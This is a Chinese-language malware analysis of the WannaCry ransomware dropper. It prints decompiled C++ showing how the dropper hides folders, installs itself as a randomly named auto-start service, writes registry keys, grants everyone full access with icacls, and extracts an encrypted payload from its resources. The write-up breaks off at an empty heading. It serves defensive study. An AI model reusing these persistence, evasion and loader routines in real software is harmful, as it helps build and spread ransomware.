# Wannacry in-depth analysis #

The WannaCry ransomware attack is an ongoing worldwide cyberattack by the WannaCry ransomware cryptoworm, which targets computers running the Microsoft Windows operating system by encrypting data and demanding ransom payments in the Bitcoin cryptocurrency.

The attack started on Friday, 12 May 2017, and within a day was reported to have infected more than 230,000 computers in over 150 countries. Parts of Britain's National Health Service (NHS), Spain's Telefónica, FedEx and Deutsche Bahn were hit, along with many other countries and companies worldwide.

作为一名安全行业工作者，我对WannaCry进行了深度的分析。 完整的分析可以帮助安全行业工作者了解黑客的的最新攻击手段，为防护领域的解决方案提供有价值的信息，更进一步尝试发现软件弱点，为客户提供有价值的数据恢复服务。

下面我将开始对我这2天分析的结果做一个全面的回顾。

我之前对CryptXXX，Cerber以及Locky这几种高热点勒索软件进行过深入分析，Wannacry这款勒索软件显然吸取了之前勒索软件的设计经验，并进化升级出了一个二阶段攻击方法。 什么是二阶段攻击呢？简单来讲，就是恶意程序本身并没有攻击行为，比如Wannacry程序自身并不做数据加密的工作，它会将真正具有攻击行为的代码动态释放出来，将数据加密的行为隐藏到释放出来的代码中。 这听起来很想壳的行为，比如Locky就是一款带壳的勒索软件，它运行起来后会通过壳代码释放恶意代码。 但壳代码本身也是一个很明显的特征，比如加过壳的代码无法进行反汇编，并且一般情况下信息熵很高，很多防护软件会对这种程序提高危险等级，用户一旦碰到，或者这种程序一旦Drop到用户的机器上就会被Detect到。 但是Wannacry不同，它的第一阶段程序完全没有任何壳代码，EntryPoint也没有做任何的定制，没有任何认为修改的痕迹，也许这也是Wannacry会在利用微软漏洞大规模被传播到Endpoint上没有被发现的原因吧。

**Hack Weapon**

在开始分析之前，想先讲一下Hack Weapon这个概念，根据很多专业机构的分析，这条黑色产业链已经发展的非常成熟了。 在暗网，你可以买到各种各样的攻击组件，组成一个有效的攻击实体；例如，有漏洞，有加载器，有加密模块等，那么我可以根据我的需要去买合适的模块，然后在进行组装成一个真正具有攻击性的恶意程序。其中这些模块就是Hack Weapon，我们收集到的很多Sample都是很多模块的组合，那我们通过in-depth的逆向分析后发现了一款恶意软件中存在有多种攻击武器的时候能否将这些攻击武器提取出来，单独建立一个Hack Weapon并对这些Hack Weapon进行特征建模，行为建模来完善我们的安全产品呢？

从技术的角度来说，Machine Instruction级别的复用是绝对一致性的，并不像源代码级别的复用会因为编译器选项的不通导致最终Machine Instruction发生细微变化。

黑客武器的提供者，应该不会提供源代码，而是将武器作为binary提供给下游黑客，所以建立这种武器库，提供了很强的特征性。 而从武器的角度去匹配恶意程序具有更准确的鉴别能力，比如说我认为一款隐蔽的Peloader模块属于恶意软件的一种，那么针对这种Weapon进行特征或行为建模将更能针对使用了这款Weapon的所有恶意软件，会是的安全防护软件具有打击多点的能力。

我曾经抽取过一款针对程序中String进行加密，并在始终之前进行解密的Hack Weapon，当时我并没有想到恶意软件会有模块化这种设计，直到在另外一款恶意软件中见到同样的行为，并且进行抽取发现整个function的flow甚至Instruction都完全一致。

这次在分析的过程中，我至少已经可以识别出两种Hack Weapon: PeLoader 和 Resource Extractor，前者用于加载一个PE file到内存中，并且在不调用微软API（不准确，极少调用，因为分配内存还需要调用VirtualAlloc）的情况下解决Import Table，Base Relocation等超麻烦的事项，以至于使用Monitor等程序都发现不了他有一个LoadDll的行为；后者用于从Resource中提取一个加密过的攻击用的PE payload，这两个模块都非常的精巧。 我想就算是作者也没有重新写一遍的念头，这需要进行大量细心的编码和大量的测试，因为稍微一些疏忽就会导致最后的攻击功亏一篑（指的是加载Payload失败）。

在这次分析结束后，我会将这两个Hack Weapon抽取出来，并写一个POC代码，复用这两个组件。


**tasksche** 

Wannacry的主程序会被修改会**tasksche.exe**，起这个名字的目的是为了迷惑用户。 下面我们来一起来分析一下这个程序，从WinMain函数开始。


> 为了容易说明程序的行为，以下的代码片段将全部使用C++语言来表述，除非碰到C++表达混乱或者因编译器优化等原因导致C++无法表达的情况下，会采用汇编语言并加详细说明。

```C++
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  char **argv; 
  void *lpPEFile; 
  CPeBuilder *pPeBuilder; 
  void (__stdcall *fpTaskStart)(_DWORD, _DWORD); 
  CProgram Program; 
  char szModuleFileName[520]; 
  int nFileSize; 

  szModuleFileName[0] = szSelfName;
  memset(&szModuleFileName[1], 0, 516u);
  *&szModuleFileName[517] = 0;
  szModuleFileName[519] = 0;
  GetModuleFileNameA(0, szModuleFileName, 520u);
  CreateRandomSequence(szServiceName);
  if ( *_p___argc() != 2
    || (argv = _p___argv(), strcmp(*(*argv + 1), aI))
    || !CreateHiddenData(0)
    || (CopyFileA(szModuleFileName, FileName, 0), GetFileAttributesA(FileName) == INVALID_FILE_ATTRIBUTES)
    || !StartMalware() )
  {
    if ( strrchr(szModuleFileName, '\\') )
      *strrchr(szModuleFileName, '\\') = 0;
    SetCurrentDirectoryA(szModuleFileName);
    WriteRegistery(1);
    ExtractFromResource(0, WNcry);
    ModifyOneByte();
    StartProcess(CommandLine, 0, 0);            // attrib +h : Sets the hidden file attribute.
    StartProcess(aIcacls_GrantEv, 0, 0);
    if ( InitKernel32Funcs() )
    {
      CProgram::ctor(&Program);
      if ( CProgram::Initialize(&Program, 0, 0, 0) )
      {
        nFileSize = 0;
        lpPEFile = CProgram::GetPeFile(&Program, aT_wnry, &nFileSize);
        if ( lpPEFile )
        {
          pPeBuilder = WncryLoadPE(lpPEFile, nFileSize);
          if ( pPeBuilder )
          {
            fpTaskStart = WncrySeek2TaskStart(pPeBuilder, szTaskStart);
            if ( fpTaskStart )
              fpTaskStart(0, 0);
          }
        }
      }
      CProgram::dtor_0(&Program);
    }
  }
  return 0;
}
```

WinMain的代码很容易理解，声明了几个变量，其中CProgram对象，CPeBuilder指针，以及fpTaskStart是整个WinMain运行的关键，WinMain的目的是动态加载一个Pe dll到内存中并运行起来，整个过程做的相当的隐蔽。 WinMain函数在栈上声明了一个520 byte的数组，用来获取当前进程的完整路径，程序会利用这个路径将文件复制一份并命名为tasksche.exe，并调用StartMalware启动自己。

在这里Malware已经通过漏洞进入Endpoint中并且被launch起来了，我认为这里存在一个common的阶段，我把这个阶段定义为**隐藏阶段**。何为隐藏阶段，换句话说在这个阶段Malware首先要做的不是执行攻击代码，而是在实施攻击之前首先隐匿自己的行踪，伪装自己为一个看起来正常的程序，并在日后的日志调查中迷惑分析人员。

```C++
if ( *_p___argc() != 2
|| (argv = _p___argv(), strcmp(*(*argv + 1), aI))
|| !CreateHiddenData(0)
|| (CopyFileA(szModuleFileName, FileName, 0), GetFileAttributesA(FileName) == INVALID_FILE_ATTRIBUTES)
|| !StartMalware() )
```

仔细看一下这段代码，Wannacry启动后的第一时间进行了几个关键操作：

- 检查启动参数
- 创建隐藏数据(folder)
- 重命名为tasksche.exe
- 再次启动自己

检查启动参数与重命名可以直接从表达式中判断出来，不复杂。

**创建隐藏数据**

```C++
int __cdecl CreateHiddenData(wchar_t *p)
{
  int result; 
  __int16 wszWindowsPath[260]; 
  __int16 wszProgramData[260];
  __int16 wszServiceName[100];

  wszWindowsPath[0] = g_ComputerName;
  memset(&wszWindowsPath[1], 0, 516u);
  wszWindowsPath[259] = 0;
  wszProgramData[0] = g_ComputerName;
  memset(&wszProgramData[1], 0, 516u);
  wszProgramData[259] = 0;
  wszServiceName[0] = g_ComputerName;
  memset(&wszServiceName[1], 0, 196u);
  wszServiceName[99] = 0;
  MultiByteToWideChar(0, 0, szServiceName, -1, wszServiceName, 99);
  GetWindowsDirectoryW(wszWindowsPath, 260u);
  wszWindowsPath[2] = 0;
  swprintf(wszProgramData, aSProgramdata, wszWindowsPath);
  if ( GetFileAttributesW(wszProgramData) != INVALID_FILE_ATTRIBUTES && CreateFolder(wszProgramData, wszServiceName, p)
    || (swprintf(wszProgramData, aSIntel, wszWindowsPath), CreateFolder(wszProgramData, wszServiceName, p))
    || CreateFolder(wszWindowsPath, wszServiceName, p) )
  {
    result = 1;
  }
  else
  {
    GetTempPathW(260u, wszProgramData);
    if ( wcsrchr(wszProgramData, '\\') )
      *wcsrchr(wszProgramData, '\\') = 0;
    result = CreateFolder(wszProgramData, wszServiceName, p) != 0;
  }
  return result;
}
```

上面的函数最终创建了**%WinDir%\ProgramData，%WinDir%\Intel**两个folder并将其属性设置为Hidden。

```C++
int __cdecl CreateFolder(LPCWSTR lpPathName, LPCWSTR lpFileName, wchar_t *String)
{
  int result; 
  DWORD fac; 

  CreateDirectoryW(lpPathName, 0);
  if ( SetCurrentDirectoryW(lpPathName) && (CreateDirectoryW(lpFileName, 0), SetCurrentDirectoryW(lpFileName)) )
  {
    fac = GetFileAttributesW(lpFileName);
    LOBYTE(fac) = fac | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN;  <<==== Note here.
    SetFileAttributesW(lpFileName, fac);
    if ( String )
      swprintf(String, aSS, lpPathName, lpFileName);
    result = 1;
  }
  else
  {
    result = 0;
  }
  return result;
}
```

上面是CreateFolder的代码，很容易理解，主要是对通过此函数创建的Folder设置Hidden属性。

**再次启动自己**

```C++
BOOL StartMalware()
{
  char szFullPath[520];

  szFullPath[0] = szSelfName;
  memset(&szFullPath[1], 0, 516u);
  *&szFullPath[517] = 0;
  szFullPath[519] = 0;
  GetFullPathNameA(FileName, 520u, szFullPath, 0);
  return StartService(szFullPath) && WaitMutex4Times(60) || StartProcess(szFullPath, 0, 0) && WaitMutex4Times(60);
}
```

注意最后一行的代码，Wannacry会用2中种方式再次启动自己，首先尝试将自己伪装成服务程序，如果失败了，在尝试通用的进程方式。

*服务方式*

在利用服务方式启动的时候，Wannacry首先会利用在WinMain中初始化的一个随机序列作为服务名称。 下面是生成随机序列的代码：

```C++
int __cdecl CreateRandomSequence(char *displayname)
{
  unsigned int nSeed; 
  int pBuffer; 
  size_t nLen; 
  int index;
  int v5;
  int v6; 
  int result; 
  __int16 Buffer[200]; 
  DWORD nSize; 
  unsigned int i; 

  Buffer[0] = g_ComputerName;
  nSize = 399;
  memset(&Buffer[1], 0, 396u);
  Buffer[199] = 0;
  GetComputerNameW(Buffer, &nSize);
  i = 0;
  nSeed = 1;
  if ( wcslen(Buffer) )
  {
    pBuffer = Buffer;
    do
    {
      nSeed *= *pBuffer;
      ++i;
      pBuffer += 2;
      nLen = wcslen(Buffer);
    }
    while ( i < nLen );
  }
  srand(nSeed);
  index = 0;
  v5 = rand() % 8 + 8;
  if ( v5 > 0 )
  {
    do
      displayname[index++] = rand() % 26 + 'a';
    while ( index < v5 );
  }
  v6 = v5 + 3;
  while ( index < v6 )
    displayname[index++] = rand() % 10 + '0';
  result = displayname;
  displayname[index] = 0;
  return result;
}
```

这段代码利用了用户的计算机名称，通过对计算机名称的每一个自己进行乘法溢出运算，会得到一个初始化随机发生器的种子值，并利用随机数发生器来生成随机的服务名称。 这个随机的服务名称由'a-z''0-9'组成。

```C++
signed int __cdecl StartService(char *pFullpath)
{
  signed int result; 
  SC_HANDLE hSCService; 
  char lpBinaryPathName; 
  SC_HANDLE hSCObject; 
  int nRet; 
  SC_HANDLE hSCManager; 

  nRet = 0;
  hSCManager = OpenSCManagerA(0, 0, SC_MANAGER_ALL_ACCESS);
  if ( hSCManager )
  {
    hSCObject = OpenServiceA(hSCManager, szServiceName, SERVICE_ALL_ACCESS);
    if ( hSCObject )
    {
      StartServiceA(hSCObject, 0, 0);
      CloseServiceHandle(hSCObject);
      result = 1;
    }
    else
    {
      sprintf(&lpBinaryPathName, Format, pFullpath);// cmd.exe /c "%s"
      hSCService = CreateServiceA(
                     hSCManager,
                     szServiceName,
                     szServiceName,
                     SERVICE_ALL_ACCESS,
                     SERVICE_WIN32_OWN_PROCESS,
                     SERVICE_AUTO_START,
                     SERVICE_ERROR_NORMAL,
                     &lpBinaryPathName,
                     0,
                     0,
                     0,
                     0,
                     0);
      if ( hSCService )
      {
        StartServiceA(hSCService, 0, 0);
        CloseServiceHandle(hSCService);
        nRet = 1;
      }
      result = nRet;
    }
    CloseServiceHandle(hSCManager);
  }
  else
  {
    result = 0;
  }
  return result;
}
```

Wannacry利用StartService函数将自身作为一个带有随机服务名称的服务进行启动，这是最容易掩人耳目的隐蔽手段。 但是如果没有权限操作服务管理器，或者意外失败了，Wannacry还有常规启动方法作为备选。

```C++
int __cdecl StartProcess(LPSTR lpCommandLine, DWORD dwMilliseconds, LPDWORD lpExitCode)
{
  int result; 
  struct _STARTUPINFOA StartupInfo;
  struct _PROCESS_INFORMATION ProcessInformation; 

  StartupInfo.cb = 0x44;
  memset(&StartupInfo.lpReserved, 0, 0x40u);
  ProcessInformation.hProcess = 0;
  ProcessInformation.hThread = 0;
  ProcessInformation.dwProcessId = 0;
  ProcessInformation.dwThreadId = 0;
  StartupInfo.wShowWindow = 0;
  StartupInfo.dwFlags = 1;
  if ( CreateProcessA(0, lpCommandLine, 0, 0, 0, CREATE_NO_WINDOW, 0, 0, &StartupInfo, &ProcessInformation) )  <<=== Note here 
  {
    if ( dwMilliseconds )
    {
      if ( WaitForSingleObject(ProcessInformation.hProcess, dwMilliseconds) )
        TerminateProcess(ProcessInformation.hProcess, 0xFFFFFFFF);
      if ( lpExitCode )
        GetExitCodeProcess(ProcessInformation.hProcess, lpExitCode);
    }
    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);
    result = 1;
  }
  else
  {
    result = 0;
  }
  return result;
}
```

StartProcess函数作为备选使用常规方式启动一个进程，这里被传入的CommandLine就是已经被改过名称为tasksche.exe的程序路径了，至少用这个名称这也有一些迷惑作用,并且一个小细节，设置了非窗口模式。

```C++
signed int __cdecl WaitMutex4Times(int param)
{
  int nCount; 
  HANDLE hMutex; 
  signed int result; 
  char szMutexName[100]; 

  sprintf(szMutexName, aSD, aGlobalMswinzon, 0);// Global\MsWinZonesCacheCounterMutexA
  nCount = 0;
  if ( param <= 0 )
  {
END:
    result = 0;
  }
  else
  {
    while ( 1 )
    {
      hMutex = OpenMutexA(SYNCHRONIZE, 1, szMutexName);// The right to use the object for synchronization. This enables a thread to wait until the object is in the signaled state.
      if ( hMutex )
        break;
      Sleep(1000u);
      ++nCount;
      if ( nCount >= param )
        goto END;
    }
    CloseHandle(hMutex);
    result = 1;
  }
  return result;
}
```

无论使用哪种方式再次启动了自己，程序都会调用上面的函数去等待**Global\MsWinZonesCacheCounterMutexA0**这个系统Mutex，并且在接下来尝试等待60次，每次1秒，共计60秒。 这么看来这个Named的Mutex对象应该在真正发起共计的模块中，这是常规的假设。

当然如果上面的方法都失败了，Wannacry也不会放弃这唯一的一次机会加密用户的数据，既然隐藏不成，那就直接干吧。 而直接干这部分代码与隐藏后再来干的代码是一样的，正好合并分析。 在开始之前还有一些事情要做：

```C++
WriteRegistry(1);
ExtractFromResource(0, WNcry);
SetBitcoinAddress();
StartProcess(CommandLine, 0, 0);            // attrib +h : Sets the hidden file attribute.
StartProcess(aIcacls_GrantEv, 0, 0);		// icacls . /grant Everyone:F /T /C /Q
if ( InitKernel32Funcs() )
```

- 写注册表
- 提取Payload
- 将Bitcoin钱包地址写入c.wnry
- 将当前工作目录隐藏
- 将当前目录授权所有人完全访问权限
- 初始化系统调用

这里面隐藏工作目录，提权，以及初始化系统调用都没有什么好说的，剩下的几个操作中，最难的是ExtractFromResource，它从资源段中释放Payload。

**写注册表**

```C++
signed int __cdecl WriteRegistry(int flag)
{
  size_t nlen; 
  LSTATUS nStatus; 
  LSTATUS nRet; 
  char szDirPath[520]; 
  wchar_t szSoftware[100]; 
  DWORD cbData; 
  int nCount; 
  HKEY phkResult; 

  qmemcpy(szSoftware, aSoftware, 0x14u);
  szDirPath[0] = 0;
  phkResult = 0;
  memset(&szSoftware[10], 0, 180u);
  memset(&szDirPath[1], 0, 516u);
  *(_WORD *)&szDirPath[517] = 0;
  szDirPath[519] = 0;
  wcscat(szSoftware, Source);                   // Software\WanaCrypt0r
  nCount = 0;
  while ( 1 )
  {
    if ( nCount )
      RegCreateKeyW(HKEY_CURRENT_USER, szSoftware, &phkResult);
    else
      RegCreateKeyW(HKEY_LOCAL_MACHINE, szSoftware, &phkResult);
    if ( phkResult )
    {
      if ( flag )
      {
        GetCurrentDirectoryA(519u, szDirPath);
        nlen = strlen(szDirPath);
        nStatus = RegSetValueExA(phkResult, ValueName, 0, 1u, (const BYTE *)szDirPath, nlen + 1) == 0;// wd
      }
      else
      {
        cbData = 519;
        nRet = RegQueryValueExA(phkResult, ValueName, 0, 0, (LPBYTE)szDirPath, &cbData);
        nStatus = nRet == ERROR_SUCCESS;
        if ( !nRet )
          SetCurrentDirectoryA(szDirPath);
      }
      RegCloseKey(phkResult);
      if ( nStatus )
        break;
    }
    ++nCount;
    if ( nCount >= 2 )
      return 0;
  }
  return 1;
}
```

Wannacry利用WriteRegistryFunc将在"HKLM\Software\WanaCrypt0r"以及"HKCU\Software\WanaCrypt0r"下面创建一个wd的键并写入当前的工作目录，我们先假设它这么做是为了防止把自己也加密了吧。

    WINDBG>du 0012f71c
    0012f71c  "Software\WanaCrypt0r"

**提取Payload**

之前提到的程序逻辑都很简单，从这里开始往后就开始有意思了，分析这些代码还是很难的，同时也非常有意思。 首先来看看 Payload Extractor的实现。

Wannacry在自己的res segment中存放了很多加密过的Data，这里面有很多有恶意的程序，要想了解它们都是做什么的，我们需要先了解它的内存布局。

提取函数首先将资源数据加载到内存中：

```C++
hRes = FindResourceA(hModule, (LPCSTR)'\b\n', aXIA);
  if ( hRes
    && (pResourceByte = LoadResource(hModule, hRes)) != 0
    && (pResource = LockResource(pResourceByte)) != 0
    && (nSize = SizeofResource(hModule, hRes), (pWnResult = StartVersion(pResource, nSize, WNcry@2ol7)) != 0) )
```


    WINDBG>db 12F644 l4
    0012f644  50 4b 05 06  									PK..


**写Bitcoin钱包地址**





